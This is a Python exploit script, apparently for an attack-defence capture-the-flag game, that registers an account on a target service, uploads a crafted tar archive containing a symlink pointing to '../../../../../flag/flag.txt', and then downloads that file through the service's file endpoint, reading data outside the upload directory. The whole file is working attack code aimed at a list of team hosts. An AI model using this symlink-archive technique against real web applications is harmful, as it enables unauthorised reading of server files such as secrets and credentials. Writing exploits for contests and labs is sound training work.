#!/usr/bin/env python3

from exploitfarm import *

def get_ip_port(data, key):
    key = str(key)  # ensure string for lookup
    return data.get("data", {}).get(key, [None])[0]

team_id = get_host()
json_data ={'data': {'6': ['10.0.38.8:40001'], '7': ['10.0.38.8:40003'], '8': ['10.0.38.8:40005'], '9': ['10.0.38.8:40007'], '10': ['10.0.38.8:40009'], '11': ['10.0.38.8:40011'], '12': ['10.0.38.8:40013'], '13': ['10.0.38.8:40015'], '14': ['10.0.38.8:40017'], '15': ['10.0.38.8:40019'], '16': ['10.0.38.8:40021'], '17': ['10.0.38.8:40023'], '18': ['10.0.38.8:40025'], '19': ['10.0.38.8:40027'], '20': ['10.0.38.8:40029']}, 'status': 'success'}
host = get_ip_port(json_data, team_id)
if host is None:
    print("[-] No host found for team ID:", team_id)

import requests
import tarfile
import io

URL = 'http://'+ host

def create_tar_with_symlink(link_target, link_path):
    """Creates a tar archive containing a symbolic link."""
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode="w") as tar:
        tarinfo = tarfile.TarInfo(name=link_path)
        tarinfo.type = tarfile.SYMTYPE
        tarinfo.linkname = link_target
        tar.addfile(tarinfo)
    tar_buffer.seek(0)
    return tar_buffer

def main():
    # 1. Register a new user
    print("[*] Registering a new user...")
    register_data = {
        "username": "testuser",
        "password": "testpassword",
        "displayName": "Test User"
    }
    session = requests.Session()
    session.post(f"{URL}/api/auth/register", json=register_data)

    # 2. Log in
    print("[*] Logging in...")
    login_data = {
        "username": "testuser",
        "password": "testpassword"
    }
    session.post(f"{URL}/api/auth/login", json=login_data)

    # 3. Create a malicious tar file with a symlink to the flag
    print("[*] Creating malicious tar file...")
    malicious_tar = create_tar_with_symlink("../../../../../flag/flag.txt", "flag.txt")

    # 4. Upload the malicious tar file
    print("[*] Uploading malicious tar file...")
    files = {"archive": ("malicious.tar", malicious_tar, "application/x-tar")}
    response = session.post(f"{URL}/api/bundles", files=files)
    bundle_id = response.json()["id"]
    print(f"[*] Malicious bundle uploaded with ID: {bundle_id}")

    # 5. Download the flag using the path traversal vulnerability
    print("[*] Downloading the flag...")
    response = session.get(f"{URL}/api/file/{bundle_id}/flag.txt")

    if response.status_code == 200:
        print("\n[+] Flag retrieved successfully!")
        print(response.text)
    else:
        print("\n[-] Failed to retrieve the flag.")
        print(f"Status code: {response.status_code}")
        print(f"Response: {response.text}")

main()